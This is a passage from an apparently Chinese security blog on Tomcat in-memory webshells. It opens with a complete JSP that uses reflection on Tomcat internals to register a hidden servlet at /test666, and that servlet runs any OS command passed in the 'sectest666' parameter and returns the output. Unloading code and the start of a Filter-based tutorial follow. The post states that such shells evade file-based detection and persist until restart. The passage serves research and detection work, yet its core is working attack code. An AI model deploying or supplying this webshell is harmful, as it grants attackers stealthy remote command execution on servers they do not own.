class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardService"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.mapper.Mapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.concurrent.ConcurrentHashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.Wrapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardWrapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ContainerBase"</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;servletContext&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">TomcatServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * webshell命令参数名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">if</span> ((cmd = req.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            resp.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            resp.getOutputStream().flush();</span><br><span class="line">            resp.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test666</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取各字段</span></span><br><span class="line">            java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">            Class applicationFilterChain = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedRequest"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedResponse"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//去掉final修饰符</span></span><br><span class="line">            java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");</span><br><span class="line">            modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置允许访问</span></span><br><span class="line">            WRAP_SAME_OBJECT.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果</span></span><br><span class="line">            <span class="keyword">if</span>(!WRAP_SAME_OBJECT.getBoolean(<span class="keyword">null</span>))&#123;</span><br><span class="line">                WRAP_SAME_OBJECT.setBoolean(<span class="keyword">null</span>,<span class="keyword">true</span>);</span><br><span class="line">                lastServicedRequest.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                lastServicedResponse.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                out.println(<span class="string">"WRAP_SAME_OBJECT change success!please try again for Inject Servlet"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ThreadLocal&lt;javax.servlet.ServletRequest&gt; threadLocalRequest = (ThreadLocal&lt;javax.servlet.ServletRequest&gt;) lastServicedRequest.get(<span class="keyword">null</span>);</span><br><span class="line">                javax.servlet.ServletRequest request1 = threadLocalRequest.get();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取servletContext</span></span><br><span class="line">                    javax.servlet.ServletContext servletContext=request1.getServletContext();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//获取applicationContext</span></span><br><span class="line">                    java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                    <span class="comment">//获取standardContext</span></span><br><span class="line">                    contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                    Field serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>);</span><br><span class="line">                    serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">                    Mapper mapper = service.getMapper();</span><br><span class="line">                    Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>);</span><br><span class="line">                    contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);</span><br><span class="line">                    Object contextVersion = contextObjectToContextVersionMap.get(standardContext);</span><br><span class="line">                    java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Wrapper wrapper = (Wrapper) standardContext.findChild(<span class="string">"test"</span>);</span><br><span class="line">                    <span class="keyword">if</span>(wrapper ==<span class="keyword">null</span>) &#123;</span><br><span class="line">                        TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); </span><br><span class="line">                        StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper();</span><br><span class="line">                        Field instanceF = wrappershell.getClass().getDeclaredField(<span class="string">"instance"</span>);</span><br><span class="line">                        instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        instanceF.set(wrappershell,tomcatServlet);</span><br><span class="line">                        wrappershell.setServletClass(<span class="string">"TomcatServlet"</span>);</span><br><span class="line">                        Field parent = ContainerBase.class.getDeclaredField("parent");</span><br><span class="line">                        parent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        parent.set(wrappershell, standardContext);</span><br><span class="line">                        wrappershell.addMapping(<span class="string">"/test666"</span>);</span><br><span class="line">                        Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">                        Class contextversionClass = classes[<span class="number">1</span>];</span><br><span class="line">                        Method addWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"addWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>, <span class="title">Wrapper</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>)</span>;</span><br><span class="line">                        addWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        addWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>, wrappershell, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">                        out.println(<span class="string">"Servlet has been Inject,please visit /test666?sectest666=whoami"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="servlet内存马卸载"><a href="#servlet内存马卸载" class="headerlink" title="servlet内存马卸载"></a>servlet内存马卸载</h2><p>​        查看org.apache.catalina.mapper.Mapper代码，发现代码中存在org.apache.catalina.mapper.Mapper#removeWrapper(org.apache.catalina.mapper.Mapper.ContextVersion, java.lang.String)方法，只需要传入ContextVersion对象和path即可完成内存马的卸载。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210105115051752.png" alt="image-20210105115051752"></p>
<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="comment">//获取servletContext</span></span><br><span class="line">                   javax.servlet.ServletContext servletContext=req.getServletContext();</span><br><span class="line">                   <span class="comment">//获取applicationContext</span></span><br><span class="line">                   java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                   contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                   org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                   <span class="comment">//获取standardContext</span></span><br><span class="line">                   contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                   contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                   org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                   Field serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>);</span><br><span class="line">                   serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                   StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">                   Mapper mapper = service.getMapper();</span><br><span class="line">                   Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>);</span><br><span class="line">                   contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                   ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);</span><br><span class="line">                   Object contextVersion = contextObjectToContextVersionMap.get(standardContext);</span><br><span class="line">                   java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                   stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                       TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet();</span><br><span class="line">                       StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper();</span><br><span class="line">                       Field instanceF = wrappershell.getClass().getDeclaredField(<span class="string">"instance"</span>);</span><br><span class="line">                       instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                       instanceF.set(wrappershell,tomcatServlet);</span><br><span class="line">                       wrappershell.setServletClass(<span class="string">"TomcatServlet"</span>);</span><br><span class="line">                       Field parent = ContainerBase.class.getDeclaredField("parent");</span><br><span class="line">                       parent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                       parent.set(wrappershell, standardContext);</span><br><span class="line">                       wrappershell.addMapping(<span class="string">"/test666"</span>);</span><br><span class="line">                       Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">                       Class contextversionClass = classes[<span class="number">1</span>];</span><br><span class="line">                       Method addWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"addWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>, <span class="title">Wrapper</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>)</span>;</span><br><span class="line">                       addWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                       addWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>, wrappershell, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">               &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/" class="post-title-link" itemprop="url">Tomcat内存马实现原理解析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-24 13:40:03" itemprop="dateCreated datePublished" datetime="2020-12-24T13:40:03+08:00">2020-12-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-31 09:58:18" itemprop="dateModified" datetime="2020-12-31T09:58:18+08:00">2020-12-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​            目前webshell的免杀开始向内存中迁移，这样实现的好处显而易见，将webshell注入到内存中，一方面增加了查杀的难度，另一方面即使我们传入的文件被查杀，只要服务器不重启，我们仍然可以利用注入到内存中的shell控制主机，所以了解内存shell的实现是比较重要的。</p>
<h2 id="动态注册Filter实现内存马"><a href="#动态注册Filter实现内存马" class="headerlink" title="动态注册Filter实现内存马"></a>动态注册Filter实现内存马</h2><p>​            要了解如何动态实现filter过滤器加载内存马，首先得了解几个问题</p>
<ul>
<li>什么是过滤器?</li>
<li>为什么要使用过滤器？</li>
<li>如何手动创建过滤器？</li>
<li>如何动态注册过滤器？</li>
</ul>
<h3 id="什么是过滤器及为什么要使用过滤器？"><a href="#什么是过滤器及为什么要使用过滤器？" class="headerlink" title="什么是过滤器及为什么要使用过滤器？"></a><strong>什么是过滤器及为什么要使用过滤器？</strong></h3><p>​        Filter也叫做过滤器，通过过滤器，可以根据访问URL的不同，对访问进行拦截处理，也可以在服务端响应给客户端之前对处理响应消息。</p>
<p>​        在servlet中提供了Filter接口，如果我们实现这个接口并实现其中的方法，可以将自己的类注册成过滤器。Filter接口定义了如下三个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">            FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>​        一般我们需要关注和实现的是doFilter方法，当我们去访问某个servlet程序，如果发现注册了filter对该servlet进行拦截，则会首先去执行filter中的doFilter方法，根据doFilter中的结果决定是否去执行servlet中的service方法。同样我们也可以通过doFilter方法，在执行service方法之前和之后执行自定义操作。</p>
<p>​        我们仔细观察doFilter方法的定义，可以看到FilterChain参数，这就是过滤器链。如果我们想要实现通过多个Filter对同一个servlet请求进行拦截，就需要用到过滤器链。过滤器链的拦截顺序和web.xml中配置的顺序有关，当执行上一个Filter的doFilter方法是，通过FilterChain.doFilter执行下一个过滤器的doFilter方法。</p>
<h3 id="如何手动创建一个过滤器？"><a href="#如何手动创建一个过滤器？" class="headerlink" title="如何手动创建一个过滤器？"></a><strong>如何手动创建一个过滤器？</strong></h3><p>​        Filter过滤器的实现有两种，第一种是在web.xml种进行配置，另一种是使用@WebFilter注解。我们首先看第一种方式。</p>
<p><strong>web.xml配置过滤器</strong></p>
<p>​        首先我们要创建一个web项目，并创建一个servlet，可以参考<code>https://blog.csdn.net/yhao2014/article/details/45740111</code>搭建，注册一个HelloWorld servlet：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        message = <span class="string">"Hello world, this message is from servlet!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//设置响应内容类型</span></span><br><span class="line">        resp.setContentType(<span class="string">"text/html"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置逻辑实现</span></span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"&lt;h1&gt;"</span> + message + <span class="string">"&lt;/h1&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225112417193.png" alt="image-20201225112417193"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225112241202.png" alt="image-20201225112241202"></p>
<p>​        </p>
<p>​        下面我们实现一个Filter在输出hello world之前和之后执行自定义操作，首先在web.xml中配置Filter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;FirstFilter&lt;/filter-name&gt;   //注册过滤器，过滤器名为FirstFilter</span><br><span class="line">    &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">FirstFilter</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt; //过滤器类为<span class="title">FirstFilter</span></span></span><br><span class="line"><span class="class">    &lt;<span class="title">init</span>-<span class="title">param</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">param</span>-<span class="title">name</span>&gt;<span class="title">encoding</span>&lt;/<span class="title">param</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">param</span>-<span class="title">value</span>&gt;<span class="title">GB2312</span>&lt;/<span class="title">param</span>-<span class="title">value</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">init</span>-<span class="title">param</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">FirstFilter</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/*&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;  //经过<span class="title">FirstFilter</span>处理的<span class="title">URL</span>，这里是所有的<span class="title">URL</span>都会经过这个过滤器处理。</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        创建过滤器类，在执行servlet之前执行对应的操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        chain.doFilter(req, resp);</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"&lt;h1&gt;执行后&lt;/h1&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span 